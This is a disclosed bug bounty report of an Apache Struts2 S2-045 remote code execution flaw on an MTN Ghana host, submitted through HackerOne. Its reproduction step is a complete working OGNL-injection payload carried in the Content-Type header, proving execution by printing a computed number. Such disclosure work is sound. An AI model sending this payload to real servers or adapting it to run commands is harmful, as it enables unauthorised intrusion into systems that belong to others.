# RCE Apache Struts2 remote command execution (S2-045) on [wifi-partner.mtn.com.gh]

## Report Details
- **Report ID**: 1070532
- **URL**: https://hackerone.com/reports/1070532
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-01-03T11:18:36.156Z
- **Disclosed**: 2021-09-09T11:34:14.647Z

## Reporter
- **Username**: pisarenko
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
A Remote Code Execution vulnerability exists in Apache Struts2 when performing file upload based on Jakarta Multipart parser. It is possible to perform a RCE attack with a malicious Content-Type value. If the Content-Type value isn't valid an exception is thrown which is then used to display an error message to a user.

## Steps To Reproduce:


 POC

`GET /pwsc/login.do HTTP/1.1
Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(31337*31337)).(#ros.flush())}
Cookie: ROUTEID=.1;JSESSIONID=13E16D2D032451B88B408F0CED57407E.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: wifi-partner.mtn.com.gh
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Connection: Keep-alive`


{F1142782} 

you can see how I performed the mathematical formula and printed it in the answer

## Impact

rce

## Attachments
- rce.png
